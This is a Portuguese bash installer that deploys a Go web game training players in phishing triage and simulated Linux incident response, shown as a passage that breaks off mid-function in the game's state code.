#!/usr/bin/env bash
set -Eeuo pipefail

# Identidade da aplicação.
APP_NAME="linux-game"
GAME_NAME="GAME SI"
COMPANY_NAME="SI Company"
GAME_VERSION="0.0.1b"
PUBLIC_PORT="80"
APP_USER="linuxgame"
APP_GROUP="linuxgame"
APP_DIR="/opt/${APP_NAME}"
SRC_DIR="${APP_DIR}/src"
BIN_PATH="${APP_DIR}/${APP_NAME}-v${GAME_VERSION}"
SERVICE_FILE="/etc/systemd/system/${APP_NAME}.service"
APP_PORT="${APP_PORT:-8080}" # Porta interna; o acesso público será feito pelo Nginx nas portas 80/443.
GAME_DOMAIN="${GAME_DOMAIN:-}"
CERTBOT_EMAIL="${CERTBOT_EMAIL:-}"
CREATE_TEMP_SWAP="${CREATE_TEMP_SWAP:-1}"
TEMP_SWAP_FILE="/swapfile-lus-build"
TEMP_SWAP_CREATED=0

log()  { printf '\033[1;34m[INFO]\033[0m %s\n' "$*"; }
ok()   { printf '\033[1;32m[ OK ]\033[0m %s\n' "$*"; }
warn() { printf '\033[1;33m[WARN]\033[0m %s\n' "$*" >&2; }
die()  { printf '\033[1;31m[ERRO]\033[0m %s\n' "$*" >&2; exit 1; }

cleanup() {
  if [[ "${TEMP_SWAP_CREATED}" == "1" ]]; then
    log "Removendo swap temporária de compilação..."
    swapoff "${TEMP_SWAP_FILE}" 2>/dev/null || true
    rm -f "${TEMP_SWAP_FILE}"
  fi
}
trap cleanup EXIT

[[ "${EUID}" -eq 0 ]] || die "Execute como root: sudo bash $0"
[[ -r /etc/os-release ]] || die "Não foi possível identificar o sistema operacional."
# shellcheck disable=SC1091
source /etc/os-release
[[ "${ID:-}" == "debian" ]] || warn "Este instalador foi preparado para Debian; detectado: ${PRETTY_NAME:-desconhecido}."
command -v apt-get >/dev/null 2>&1 || die "apt-get não encontrado."
command -v systemctl >/dev/null 2>&1 || die "systemd não encontrado."

[[ "${APP_PORT}" =~ ^[0-9]+$ ]] || die "APP_PORT precisa ser numérico."
(( APP_PORT >= 1024 && APP_PORT <= 65535 )) || die "A porta interna APP_PORT deve estar entre 1024 e 65535."
[[ "${PUBLIC_PORT}" =~ ^[0-9]+$ ]] || die "PUBLIC_PORT precisa ser numérica."
(( PUBLIC_PORT >= 1 && PUBLIC_PORT <= 65535 )) || die "PUBLIC_PORT deve estar entre 1 e 65535."
printf '%s' "${GAME_NAME}" | grep -Eq '^[A-Za-z0-9][A-Za-z0-9 ._-]*$' || die "GAME_NAME contém caracteres não permitidos."
printf '%s' "${COMPANY_NAME}" | grep -Eq '^[A-Za-z0-9][A-Za-z0-9 ._-]*$' || die "COMPANY_NAME contém caracteres não permitidos."

# HTTPS público exige domínio real apontando para o IP desta VPS.
if [[ -z "${GAME_DOMAIN}" ]]; then
  read -r -p "Digite o domínio/subdomínio para o jogo (ex.: jogo.seudominio.com): " GAME_DOMAIN
fi
GAME_DOMAIN="${GAME_DOMAIN,,}"
[[ "${GAME_DOMAIN}" =~ ^[a-z0-9]([a-z0-9.-]*[a-z0-9])?$ ]] || die "Domínio inválido. Informe um domínio DNS, não um endereço IP."
[[ "${GAME_DOMAIN}" == *.* ]] || die "Informe um domínio completo, como jogo.seudominio.com."
[[ "${GAME_DOMAIN}" != *..* && "${GAME_DOMAIN}" != *.-* && "${GAME_DOMAIN}" != *-.* ]] || die "Formato de domínio inválido."
if [[ -z "${CERTBOT_EMAIL}" ]]; then
  read -r -p "E-mail para avisos de expiração do certificado (opcional, Enter para pular): " CERTBOT_EMAIL
fi

log "Instalando dependências mínimas..."
export DEBIAN_FRONTEND=noninteractive
apt-get update
apt-get install -y --no-install-recommends golang-go ca-certificates nginx curl certbot python3-certbot-nginx

if systemctl is-active --quiet "${APP_NAME}.service" 2>/dev/null; then
  log "Parando instalação anterior..."
  systemctl stop "${APP_NAME}.service"
fi

if ! getent group "${APP_GROUP}" >/dev/null; then
  groupadd --system "${APP_GROUP}"
fi
if ! id "${APP_USER}" >/dev/null 2>&1; then
  useradd --system \
    --gid "${APP_GROUP}" \
    --home-dir "/var/lib/${APP_NAME}" \
    --shell /usr/sbin/nologin \
    "${APP_USER}"
fi

install -d -m 0755 -o root -g root "${APP_DIR}"
rm -rf "${SRC_DIR}"
install -d -m 0755 -o root -g root "${SRC_DIR}"
install -d -m 0750 -o "${APP_USER}" -g "${APP_GROUP}" "/var/lib/${APP_NAME}"

cat > "${SRC_DIR}/main.go" <<'EOF_GO'
package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	appVersion    = "10.0.0"
	sessionCookie = "lus_session"
	gameDuration  = 300
	inboxDuration = 300
	maxSessions   = 250
)

type Threat struct {
	ID       string `json:"id"`
	Name     string `json:"name"`
	StartsAt int    `json:"startsAt"`
	Hint     string `json:"hint"`
}

var threats = []Threat{
	{"brute", "Força bruta no SSH", 15, "Investigue logs e conexões; bloqueie a origem e corrija o SSH."},
	{"account", "Conta administrativa suspeita", 50, "Verifique usuários criados recentemente."},
	{"process", "Processo desconhecido", 85, "Analise processos e interrompa o PID suspeito."},
	{"tamper", "Arquivo de configuração alterado", 125, "Confira arquivos críticos e restaure o arquivo modificado."},
	{"exfil", "Conexão de saída suspeita", 170, "Inspecione conexões e bloqueie o destino externo."},
}

type LogEntry struct {
	At   string `json:"at"`
	Kind string `json:"kind"`
	Text string `json:"text"`
	Cwd  string `json:"cwd,omitempty"`
}

type EmailDefinition struct {
	ID        string
	Malicious bool
}

type EmailDelivery struct {
	ID        string
	ArrivesAt int
}

type InboxEmailState struct {
	ID         string `json:"id"`
	ArrivedAt  int    `json:"arrivedAt"`
	Read       bool   `json:"read"`
	ActionDone bool   `json:"actionDone"`
	Reported   bool   `json:"reported"`
}

type InboxProgress struct {
	Total             int `json:"total"`
	Delivered         int `json:"delivered"`
	Read              int `json:"read"`
	Unread            int `json:"unread"`
	SafeActionsDone   int `json:"safeActionsDone"`
	SafeActionsTotal  int `json:"safeActionsTotal"`
	Reports           int `json:"reports"`
	FalseReports      int `json:"falseReports"`
	MaliciousReported int `json:"maliciousReported"`
	MaliciousTotal    int `json:"maliciousTotal"`
}

var emailDefinitions = []EmailDefinition{
	{"welcome", false},
	{"manager", false},
	{"access-expiration", true},
	{"training", false},
	{"noc", false},
	{"benefits", false},
	{"soc-guide", false},
	{"payroll-info", false},
	{"vpn-guide", false},
	{"backup-policy", false},
	{"payroll-update", true},
	{"shared-document", true},
}

type Session struct {
	ID               string
	Nick             string
	Started          time.Time
	InboxStarted     time.Time
	Phase            string
	ClickedEmail     string
	PhishingDetected bool
	EmailSchedule    []EmailDelivery
	ReadEmails       map[string]bool
	ClickedEmailLinks map[string]bool
	ReportedEmails   map[string]bool
	FalseReports     int
	InboxOutcome     string
	InboxMessage     string
	LastSeen         time.Time
	LastCommand      time.Time
	DamageTick       int
	Integrity        int
	Score            int
	Blocked          map[string]bool
	Locked           map[string]bool
	Killed           map[int]bool
	Restored         map[string]bool
	Patched          map[string]bool
	History          []LogEntry
	Announced        map[string]bool
	Completed        bool
	Failed           bool
	RankingSaved     bool
	Cwd              string
	PrevCwd          string
	Files            map[string]string
	Dirs             map[string]bool
	Removed          map[string]bool
}

type RankingEntry struct {
	Nick      string `json:"nick"`
	Score     int    `json:"score"`
	Integrity int    `json:"integrity"`
	Date      string `json:"date"`
}

type Server struct {
	mu       sync.Mutex
	sessions map[string]*Session
	ranking  []RankingEntry
	dataDir  string
}

type CommandRequest struct {
	Command string `json:"command"`
}

type CompleteRequest struct {
	Line   string `json:"line"`
	Cursor int    `json:"cursor"`
}

type CompletionItem struct {
	Value string `json:"value"`
	Dir   bool   `json:"dir"`
}

type CompleteResponse struct {
	Start   int              `json:"start"`
	End     int              `json:"end"`
	Current string           `json:"current"`
	Items   []CompletionItem `json:"items"`
}

type StartRequest struct {
	Nick string `json:"nick"`
}

type PhishRequest struct {
	EmailID string `json:"emailId"`
	Action  string `json:"action"`
}

type Objective struct {
	Name   string `json:"name"`
	Active bool   `json:"active"`
	Done   bool   `json:"done"`
}

type StateResponse struct {
	Nick             string            `json:"nick"`
	Phase            string            `json:"phase"`
	InboxRemaining   int               `json:"inboxRemaining"`
	InboxEmails      []InboxEmailState `json:"inboxEmails"`
	InboxProgress    InboxProgress     `json:"inboxProgress"`
	InboxOutcome     string            `json:"inboxOutcome"`
	InboxMessage     string            `json:"inboxMessage"`
	ClickedEmail     string            `json:"clickedEmail"`
	PhishingDetected bool              `json:"phishingDetected"`
	TimeRemaining    int               `json:"timeRemaining"`
	Elapsed          int               `json:"elapsed"`
	Integrity        int               `json:"integrity"`
	Score            int               `json:"score"`
	ThreatLevel      string            `json:"threatLevel"`
	Objectives       []Objective       `json:"objectives"`
	History          []LogEntry        `json:"history"`
	Completed        bool              `json:"completed"`
	Failed           bool              `json:"failed"`
	Cwd              string            `json:"cwd"`
}

func main() {
	if len(os.Args) > 1 && os.Args[1] == "--self-test" {
		if err := runSelfTest(); err != nil {
			fmt.Fprintln(os.Stderr, "SELFTEST FALHOU:", err)
			os.Exit(1)
		}
		fmt.Println("SELFTEST OK - GAME SI", appVersion)
		return
	}

	dataDir := os.Getenv("DATA_DIR")
	if dataDir == "" {
		dataDir = "/var/lib/linux-under-siege"
	}
	if err := os.MkdirAll(dataDir, 0750); err != nil {
		log.Fatal(err)
	}

	srv := &Server{sessions: make(map[string]*Session), dataDir: dataDir}
	srv.loadRanking()
	go srv.cleanupLoop()

	mux := http.NewServeMux()
	mux.HandleFunc("/", srv.handleIndex)
	mux.HandleFunc("/healthz", srv.handleHealth)
	mux.HandleFunc("/api/start", srv.handleStart)
	mux.HandleFunc("/api/phish", srv.handlePhish)
	mux.HandleFunc("/api/state", srv.handleState)
	mux.HandleFunc("/api/command", srv.handleCommand)
	mux.HandleFunc("/api/complete", srv.handleComplete)
	mux.HandleFunc("/api/ranking", srv.handleRanking)

	addr := os.Getenv("LISTEN_ADDR")
	if addr == "" {
		addr = "127.0.0.1:8080"
	}

	server := &http.Server{
		Addr:              addr,
		Handler:           securityHeaders(mux),
		ReadHeaderTimeout: 5 * time.Second,
		ReadTimeout:       8 * time.Second,
		WriteTimeout:      12 * time.Second,
		IdleTimeout:       60 * time.Second,
		MaxHeaderBytes:    16 << 10,
	}

	log.Printf("GAME SI ouvindo em %s", addr)
	log.Fatal(server.ListenAndServe())
}

func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("Referrer-Policy", "no-referrer")
		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
		w.Header().Set("Pragma", "no-cache")
		w.Header().Set("Expires", "0")
		w.Header().Set("Content-Security-Policy", "default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self'; img-src 'self' data:; font-src 'self'")
		next.ServeHTTP(w, r)
	})
}

func (s *Server) handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	if r.Method != http.MethodGet {
		http.Error(w, "método não permitido", http.StatusMethodNotAllowed)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(indexHTML))
}

func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	writeJSON(w, map[string]interface{}{"ok": true, "version": appVersion, "grepEngine": "virtual-stream-v2"})
}

func (s *Server) handleStart(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "método não permitido", http.StatusMethodNotAllowed)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 2048)
	var req StartRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "JSON inválido", http.StatusBadRequest)
		return
	}

	nick := sanitizeNick(req.Nick)
	id := randomID(16)
	if nick == "" {
		nick = "Analista-" + strings.ToUpper(id[:4])
	}

	now := time.Now()
	session := &Session{
		ID: id, Nick: nick, InboxStarted: now, Phase: "inbox", LastSeen: now, Integrity: 100,
		Blocked: make(map[string]bool), Locked: make(map[string]bool),
		Killed: make(map[int]bool), Restored: make(map[string]bool),
		Patched: make(map[string]bool), Announced: make(map[string]bool),
		Cwd: "/root", PrevCwd: "/root", Files: make(map[string]string),
		Dirs: make(map[string]bool), Removed: make(map[string]bool),
		EmailSchedule: buildEmailSchedule(), ReadEmails: make(map[string]bool),
		ClickedEmailLinks: make(map[string]bool), ReportedEmails: make(map[string]bool),
	}

	s.mu.Lock()
	if len(s.sessions) >= maxSessions {
		s.evictOldestLocked()
	}
	s.sessions[id] = session
	s.mu.Unlock()

	http.SetCookie(w, &http.Cookie{
		Name: sessionCookie, Value: id, Path: "/", HttpOnly: true,
		SameSite: http.SameSiteLaxMode, MaxAge: 1800,
	})
	writeJSON(w, map[string]interface{}{"ok": true, "nick": nick})
}

func emailDefinitionByID(id string) (EmailDefinition, bool) {
	for _, item := range emailDefinitions {
		if item.ID == id {
			return item, true
		}
	}
	return EmailDefinition{}, false
}

func secureRandomInt(limit int) int {
	if limit <= 1 {
		return 0
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(limit)))
	if err != nil {
		return int(time.Now().UnixNano() % int64(limit))
	}
	return int(n.Int64())
}

func buildEmailSchedule() []EmailDelivery {
	// Todos os e-mails são embaralhados por sessão e distribuídos ao longo dos
	// cinco minutos. Cada ID aparece exatamente uma vez.
	ids := make([]string, 0, len(emailDefinitions))
	for _, item := range emailDefinitions {
		ids = append(ids, item.ID)
	}
	for i := len(ids) - 1; i > 0; i-- {
		j := secureRandomInt(i + 1)
		ids[i], ids[j] = ids[j], ids[i]
	}
	slots := []int{0, 11, 25, 43, 63, 85, 109, 135, 163, 193, 225, 252}
	schedule := make([]EmailDelivery, 0, len(ids))
	last := -5
	for i, id := range ids {
		at := slots[i]
		if i > 0 {
			at += secureRandomInt(7) - 3
		}
		if at <= last+4 {
			at = last + 5
		}
		if at >= inboxDuration-35 {
			at = inboxDuration - 36
		}
		schedule = append(schedule, EmailDelivery{ID: id, ArrivesAt: at})
		last = at
	}
	return schedule
}

func emailDeliveryAt(g *Session, id string) (int, bool) {
	for _, item := range g.EmailSchedule {
		if item.ID == id {
			return item.ArrivesAt, true
		}
	}
	return 0, false
}

func emailDelivered(g *Session, id string, elapsed int) bool {
	at, ok := emailDeliveryAt(g, id)
	return ok && elapsed >= at
}

func (s *Server) handlePhish(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "método não permitido", http.StatusMethodNotAllowed)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 2048)
	var req PhishRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "JSON inválido", http.StatusBadRequest)
		return
	}
	req.EmailID = strings.TrimSpace(req.EmailID)
	req.Action = strings.ToLower(strings.TrimSpace(req.Action))
	definition, known := emailDefinitionByID(req.EmailID)
	if !known {
		http.Error(w, "e-mail desconhecido", http.StatusBadRequest)
		return
	}

	s.mu.Lock()
	session := s.sessionFromRequestLocked(r)
	if session == nil {
		s.mu.Unlock()
		http.Error(w, "partida não iniciada", http.StatusUnauthorized)
		return
	}
	now := time.Now()
	s.updateSessionLocked(session, now)
	if session.Phase != "inbox" {
		state := s.stateLocked(session)
		event := session.Phase
		s.mu.Unlock()
		writeJSON(w, map[string]interface{}{"ok": true, "event": event, "state": state})
		return
	}

	elapsed := int(now.Sub(session.InboxStarted).Seconds())
	if !emailDelivered(session, req.EmailID, elapsed) {
		s.mu.Unlock()
		http.Error(w, "a mensagem ainda não chegou", http.StatusConflict)
		return
	}

	event := "opened"
	switch req.Action {
	case "open":
		if !session.ReadEmails[req.EmailID] {
			session.ReadEmails[req.EmailID] = true
			session.Score += 20
		}
	case "click":
		if !session.ReadEmails[req.EmailID] {
			s.mu.Unlock()
			http.Error(w, "abra o e-mail antes de acessar o link", http.StatusConflict)
			return
		}
		if definition.Malicious {
			if session.ReportedEmails[req.EmailID] {
				event = "already_reported"
				break
			}
			s.startIncidentLocked(session, req.EmailID, now)
			event = "incident"
		} else {
			if !session.ClickedEmailLinks[req.EmailID] {
				session.ClickedEmailLinks[req.EmailID] = true
				session.Score += 90
				event = "safe_link"
			} else {
				event = "safe_link_done"
			}
			s.maybeCompleteInboxLocked(session, now)
		}
	case "report":
		if !session.ReadEmails[req.EmailID] {
			s.mu.Unlock()
			http.Error(w, "abra o e-mail antes de reportá-lo", http.StatusConflict)
			return
		}
		if session.ReportedEmails[req.EmailID] {
			event = "already_reported"
			break
		}
		session.ReportedEmails[req.EmailID] = true
		if definition.Malicious {
			session.PhishingDetected = true
			session.Score += 260
			event = "correct_report"
			s.maybeCompleteInboxLocked(session, now)
		} else {
			session.FalseReports++
			session.Score = maxInt(0, session.Score-180)
			event = "false_report"
			if session.FalseReports >= 3 {
				s.failInboxLocked(session, now, "false-reports")
				event = "mail_failed"
			}
		}
	default:
		s.mu.Unlock()
		http.Error(w, "ação inválida", http.StatusBadRequest)
		return
	}

	s.saveRankingIfNeededLocked(session, now)
	state := s.stateLocked(session)
	s.mu.Unlock()
	writeJSON(w, map[string]interface{}{"ok": true, "event": event, "state": state})
}

func (s *Server) handleState(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "método não permitido", http.StatusMethodNotAllowed)
		return
	}
	s.mu.Lock()
	session := s.sessionFromRequestLocked(r)
	if session == nil {
		s.mu.Unlock()
		http.Error(w, "partida não iniciada", http.StatusUnauthorized)
		return
	}
	s.updateSessionLocked(session, time.Now())
	state := s.stateLocked(session)
	s.mu.Unlock()
	writeJSON(w, state)
}

func (s *Server) handleCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "método não permitido", http.StatusMethodNotAllowed)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 2048)
	var req CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "JSON inválido", http.StatusBadRequest)
		return
	}
	req.Command = strings.TrimSpace(req.Command)
	if len(req.Command) == 0 || len(req.Command) > 256 {
		http.Error(w, "comando inválido", http.StatusBadRequest)
		return
	}

	s.mu.Lock()
	session := s.sessionFromRequestLocked(r)
	if session == nil {
		s.mu.Unlock()
		http.Error(w, "partida não iniciada", http.StatusUnauthorized)
		return
	}
	if session.Phase != "incident" {
		s.mu.Unlock()
		http.Error(w, "o terminal será liberado quando um incidente começar", http.StatusConflict)
		return
	}
	now := time.Now()
	if now.Sub(session.LastCommand) < 200*time.Millisecond {
		s.mu.Unlock()
		http.Error(w, "comandos rápidos demais", http.StatusTooManyRequests)
		return
	}
	session.LastCommand = now
	s.updateSessionLocked(session, now)
	output := s.executeLocked(session, req.Command)
	s.updateSessionLocked(session, now)
	state := s.stateLocked(session)
	s.mu.Unlock()

	writeJSON(w, map[string]interface{}{"output": output, "state": state})
}

func (s *Server) handleComplete(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "método não permitido", http.StatusMethodNotAllowed)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 4096)
	var req CompleteRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "JSON inválido", http.StatusBadRequest)
		return
	}
	if len(req.Line) > 512 {
		http.Error(w, "linha muito longa", http.StatusBadRequest)
		return
	}
	if req.Cursor < 0 || req.Cursor > len(req.Line) {
		req.Cursor = len(req.Line)
	}

	s.mu.Lock()
	session := s.sessionFromRequestLocked(r)
	if session == nil {
		s.mu.Unlock()
		http.Error(w, "partida não iniciada", http.StatusUnauthorized)
		return
	}
	if session.Phase != "incident" {
		s.mu.Unlock()
		http.Error(w, "autocomplete indisponível antes do incidente", http.StatusConflict)
		return
	}
	s.updateSessionLocked(session, time.Now())
	result := completionForLine(session, req.Line, req.Cursor, int(time.Since(session.Started).Seconds()))
	s.mu.Unlock()
	writeJSON(w, result)
}

func (s *Server) handleRanking(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "método não permitido", http.StatusMethodNotAllowed)
		return
	}
	s.mu.Lock()
	ranking := append([]RankingEntry(nil), s.ranking...)
	s.mu.Unlock()
	if len(ranking) > 10 {
		ranking = ranking[:10]
	}
	writeJSON(w, ranking)
}

func (s *Server) updateSessionLocked(g *Session, now time.Time) {
	g.LastSeen = now
	if g.Phase == "" {
		g.Phase = "incident"
		if g.Started.IsZero() {
			g.Started = now
		}
	}
	if g.Phase == "inbox" {
		elapsedInbox := int(now.Sub(g.InboxStarted).Seconds())
		if elapsedInbox >= inboxDuration {
			s.finishInboxAtTimeoutLocked(g, now)
			s.saveRankingIfNeededLocked(g, now)
		}
		return
	}
	if g.Completed || g.Failed {
		s.saveRankingIfNeededLocked(g, now)
		return
	}
	if g.Phase != "incident" {
		return
	}

	elapsed := int(now.Sub(g.Started).Seconds())
	if elapsed < 0 {
		elapsed = 0
	}

	for _, t := range threats {
		if elapsed >= t.StartsAt && !g.Announced[t.ID] {
			g.Announced[t.ID] = true
			switch t.ID {
			case "brute":
				g.addLog("danger", "ALERTA: 37 falhas de login SSH vindas de 203.0.113.77.")
			case "account":
				g.addLog("danger", "ALERTA: nova conta administrativa: system-update.")
			case "process":
				g.addLog("danger", "ALERTA: processo PID 731 iniciou consumo anormal de CPU.")
			case "tamper":
				g.addLog("danger", "ALERTA: /etc/ssh/sshd_config teve sua integridade alterada.")
			case "exfil":
				g.addLog("danger", "ALERTA: tráfego de saída persistente para 198.51.100.42.")
			}
		}
	}

	targetTick := elapsed / 5
	for g.DamageTick < targetTick {
		tickSecond := (g.DamageTick + 1) * 5
		damage := s.unresolvedAt(g, tickSecond)
		if damage > 0 {
			g.Integrity -= damage
			if g.Integrity < 0 {
				g.Integrity = 0
			}
		}
		g.DamageTick++
	}

	if s.allResolved(g, elapsed) {
		g.Completed = true
		bonus := maxInt(0, gameDuration-elapsed) * 2
		g.Score += 500 + bonus + g.Integrity*3
		g.addLog("success", "SERVIDOR PROTEGIDO — todas as ameaças foram neutralizadas.")
	} else if elapsed >= gameDuration || g.Integrity <= 0 {
		g.Failed = true
		g.addLog("danger", "SISTEMA COMPROMETIDO — a resposta defensiva não foi concluída.")
	}

	s.saveRankingIfNeededLocked(g, now)
}

func (s *Server) startIncidentLocked(g *Session, emailID string, now time.Time) {
	g.Phase = "incident"
	g.ClickedEmail = emailID
	g.InboxOutcome = "phished"
	g.InboxMessage = "Um link malicioso capturou a sessão administrativa. Contenha o ataque no servidor Linux."
	g.Started = now
	g.DamageTick = 0
	g.Integrity = 100
	g.Score = maxInt(0, g.Score-250)
	g.Completed = false
	g.Failed = false
	g.RankingSaved = false
	g.History = nil
	g.addLog("danger", "ALERTA: um link do onboarding capturou o token SSO administrativo.")
	g.addLog("system", "INCIDENTE INICIADO — uma sessão remota foi aberta no servidor ubuntu-prod-01.")
	g.addLog("info", "Você tem 5 minutos para conter o ataque. Digite help para consultar os comandos.")
}

func inboxEmailStates(g *Session, elapsed int) []InboxEmailState {
	states := make([]InboxEmailState, 0, len(g.EmailSchedule))
	for _, delivery := range g.EmailSchedule {
		if elapsed < delivery.ArrivesAt {
			continue
		}
		states = append(states, InboxEmailState{
			ID: delivery.ID, ArrivedAt: delivery.ArrivesAt,
			Read: g.ReadEmails[delivery.ID], ActionDone: g.ClickedEmailLinks[delivery.ID],
			Reported: g.ReportedEmails[delivery.ID],
		})
	}
	return states
}

func inboxProgress(g *Session, elapsed int) InboxProgress {
	p := InboxProgress{Total: len(emailDefinitions), FalseReports: g.FalseReports}
	for _, definition := range emailDefinitions {
		if definition.Malicious {
			p.MaliciousTotal++
		} else {
			p.SafeActionsTotal++
		}
		if g.ReadEmails[definition.ID] {
			p.Read++
		}
		if g.ClickedEmailLinks[definition.ID] && !definition.Malicious {
			p.SafeActionsDone++
		}
		if g.ReportedEmails[definition.ID] {
			p.Reports++
			if definition.Malicious {
				p.MaliciousReported++
			}
		}
	}
	for _, delivery := range g.EmailSchedule {
		if elapsed >= delivery.ArrivesAt {
			p.Delivered++
		}
	}
	p.Unread = p.Delivered - p.Read
	if p.Unread < 0 {
		p.Unread = 0
	}
	return p
}

func inboxRequirementsMet(g *Session) bool {
	for _, definition := range emailDefinitions {
		if !g.ReadEmails[definition.ID] {
			return false
		}
		if definition.Malicious {
			if !g.ReportedEmails[definition.ID] {
				return false
			}
		} else if !g.ClickedEmailLinks[definition.ID] {
			return false
		}
	}
	return true
}

func allInboxEmailsDelivered(g *Session, elapsed int) bool {
	for _, delivery := range g.EmailSchedule {
		if elapsed < delivery.ArrivesAt {
			return false
		}
	}
	return true
}

func (s *Server) maybeCompleteInboxLocked(g *Session, now time.Time) {
	if g.Phase != "inbox" {
		return
	}
	elapsed := int(now.Sub(g.InboxStarted).Seconds())
	if allInboxEmailsDelivered(g, elapsed) && inboxRequirementsMet(g) {
		remaining := maxInt(0, inboxDuration-elapsed)
		g.Phase = "mail_won"
		g.Completed = true
		g.Failed = false
		g.Integrity = 100
		g.InboxOutcome = "success"
		g.InboxMessage = "Todos os e-mails foram lidos, os portais legítimos foram acessados e todas as mensagens maliciosas foram reportadas."
		g.Score += 1500 + remaining*3
	}
}

func (s *Server) failInboxLocked(g *Session, now time.Time, reason string) {
	if g.Phase != "inbox" {
		return
	}
	g.Phase = "mail_failed"
	g.Completed = false
	g.Failed = true
	g.Integrity = 0
	g.InboxOutcome = reason
	switch reason {
	case "false-reports":
		g.InboxMessage = "Três e-mails legítimos foram reportados como suspeitos. A operação foi interrompida por excesso de falsos positivos."
	case "no-email-opened":
		g.InboxMessage = "A janela de onboarding terminou sem que nenhuma mensagem fosse aberta."
	case "unread-emails":
		g.InboxMessage = "O tempo terminou com mensagens não lidas na caixa de entrada."
	case "safe-links-missing":
		g.InboxMessage = "Nem todos os conteúdos obrigatórios dos e-mails legítimos foram acessados."
	case "suspicious-unreported":
		g.InboxMessage = "Uma ou mais mensagens maliciosas permaneceram sem denúncia ao SOC."
	default:
		g.InboxMessage = "Os requisitos da triagem de e-mails não foram concluídos dentro do tempo."
	}
}

func (s *Server) finishInboxAtTimeoutLocked(g *Session, now time.Time) {
	if g.Phase != "inbox" {
		return
	}
	if inboxRequirementsMet(g) {
		s.maybeCompleteInboxLocked(g, now)
		return
	}
	p := inboxProgress(g, inboxDuration)
	if p.Read == 0 {
		s.failInboxLocked(g, now, "no-email-opened")
		return
	}
	if p.Read < p.Total {
		s.failInboxLocked(g, now, "unread-emails")
		return
	}
	if p.SafeActionsDone < p.SafeActionsTotal {
		s.failInboxLocked(g, now, "safe-links-missing")
		return
	}
	if p.MaliciousReported < p.MaliciousTotal {
		s.failInboxLocked(g, now, "suspicious-unreported")
		return
	}
	s.failInboxLocked(g, now, "incomplete")
}

func (s *Server) saveRankingIfNeededLocked(g *Session, now time.Time) {
	if !(g.Completed || g.Failed) || g.RankingSaved {
		return
	}
	g.RankingSaved = true
	s.ranking = append(s.ranking, RankingEntry{g.Nick, g.Score, g.Integrity, now.Format("2006-01-02 15:04")})
	sort.Slice(s.ranking, func(i, j int) bool {
		if s.ranking[i].Score == s.ranking[j].Score {
			return s.ranking[i].Integrity > s.ranking[j].Integrity
		}
		return s.ranking[i].Score > s.ranking[j].Score
	})
	if len(s.ranking) > 50 {
		s.ranking = s.ranking[:50]
	}
	s.saveRankingLocked()
}

func (s *Server) unresolvedAt(g *Session, second int) int {
	count := 0
	if second >= 15 && !(g.Blocked["203.0.113.77"] && g.Patched["ssh"]) {
		count++
	}
	if second >= 50 && !g.Locked["system-update"] {
		count++
	}
	if second >= 85 && !g.Killed[731] {
		count++
	}
	if second >= 125 && !g.Restored["/etc/ssh/sshd_config"] {
		count++
	}
	if second >= 170 && !g.Blocked["198.51.100.42"] {
		count++
	}
	return count
}

func (s *Server) allResolved(g *Session, elapsed int) bool {
	return elapsed >= 170 &&
		g.Blocked["203.0.113.77"] && g.Patched["ssh"] &&
		g.Locked["system-update"] && g.Killed[731] &&
		g.Restored["/etc/ssh/sshd_config"] && g.Blocked["198.51.100.42"]
}

func objectiveSnapshot(g *Session, elapsed int) []Objective {
	return []Objective{
		{"Bloquear a origem da força bruta", elapsed >= 15, g.Blocked["203.0.113.77"]},
		{"Aplicar correção no serviço SSH", elapsed >= 15, g.Patched["ssh"]},
		{"Bloquear a conta suspeita", elapsed >= 50, g.Locked["system-update"]},
		{"Interromper o processo malicioso", elapsed >= 85, g.Killed[731]},
		{"Restaurar o arquivo alterado", elapsed >= 125, g.Restored["/etc/ssh/sshd_config"]},
		{"Bloquear a conexão de exfiltração", elapsed >= 170, g.Blocked["198.51.100.42"]},
	}
}

func (s *Server) stateLocked(g *Session) StateResponse {
	now := time.Now()
	if g.Phase == "inbox" || g.Phase == "mail_won" || g.Phase == "mail_failed" {
		elapsedInbox := int(now.Sub(g.InboxStarted).Seconds())
		if elapsedInbox < 0 {
			elapsedInbox = 0
		}
		remainingInbox := inboxDuration - elapsedInbox
		if remainingInbox < 0 || g.Phase != "inbox" {
			remainingInbox = 0
		}
		visibleElapsed := elapsedInbox
		if visibleElapsed > inboxDuration {
			visibleElapsed = inboxDuration
		}
		return StateResponse{
			Nick: g.Nick, Phase: g.Phase, InboxRemaining: remainingInbox,
			InboxEmails: inboxEmailStates(g, visibleElapsed), InboxProgress: inboxProgress(g, visibleElapsed),
